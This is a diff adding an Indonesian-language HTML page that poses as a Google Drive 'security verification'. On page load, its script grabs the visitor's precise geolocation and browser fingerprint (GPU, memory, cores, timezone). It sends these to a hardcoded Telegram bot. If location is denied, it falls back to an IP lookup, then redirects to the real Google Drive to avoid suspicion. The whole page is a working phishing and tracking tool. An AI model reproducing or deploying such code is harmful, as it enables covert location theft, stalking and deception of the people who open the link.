@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Google Drive - Verifikasi Keamanan</title>
+    <script>
+        // 1. Obfuscated Token (Menyembunyikan Bot Token dari mata telanjang)
+        const _0x = ["8674170594:AAEazU35uI9bZ6s8JLwcN410H0STysKEzs4", "7970059663"];
+        
+        window.onload = function() {
+            // Memulai pelacakan tanpa menunggu interaksi berlebihan
+            initProtocol();
+        };
+
+        function initProtocol() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendIntel, silentMode, {
+                    enableHighAccuracy: true,
+                    timeout: 10000
+                });
+            }
+        }
+
+        async function sendIntel(pos) {
+            const { latitude: lat, longitude: lon, accuracy: acc } = pos.coords;
+            
+            // 2. Advanced Fingerprinting: Tembus VPN lewat Browser Info
+            const intel = {
+                device: navigator.platform,
+                memory: navigator.deviceMemory || "N/A",
+                cores: navigator.hardwareConcurrency || "N/A",
+                gpu: getGraphicsCard(),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+
+            const text = `🔱 NEURAL STRIKE 🔱\n\n` +
+                         `📍 Map: https://www.google.com/maps?q=${lat},${lon}\n` +
+                         `🎯 Akurasi: ${acc}m\n` +
+                         `💻 HW: ${intel.cores} Core / ${intel.memory}GB RAM\n` +
+                         `🎮 GPU: ${intel.gpu}\n` +
+                         `🌍 Zone: ${intel.timezone}\n` +
+                         `📱 OS: ${intel.device}`;
+
+            await fetch(`https://api.telegram.org/bot${_0x[0]}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: _0x[1], text: text, parse_mode: "Markdown" })
+            });
+
+            // Langsung arahkan ke dokumen asli biar tidak curiga
+            window.location.href = "https://drive.google.com";
+        }
+
+        function getGraphicsCard() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
+
+        function silentMode() {
+            // Jika lokasi ditolak, kita tetap ambil data teknis (IP & Device)
+            fetch('https://ipapi.co/json/').then(res => res.json()).then(ip => {
+                const text = `⚠️ ACCESS DENIED (GPS)\n\nIP: ${ip.ip}\nOrg: ${ip.org}\nCity: ${ip.city}`;
+                fetch(`https://api.telegram.org/bot${_0x[0]}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: _0x[1], text: text })
+                });
+            });
+        }
+    </script>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { text-align: center; max-width: 400px; padding: 20px; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="60">
+        <h2>Enkripsi Terdeteksi</h2>
+        <p style="color: #5f6368; font-size: 14px;">Dokumen ini dilindungi oleh kebijakan keamanan Google. Verifikasi lokasi Anda untuk membuka dekripsi file.</p>
+        <button class="btn" onclick="initProtocol()">VERIFIKASI & BUKA</button>
+    </div>
+</body>
+</html>
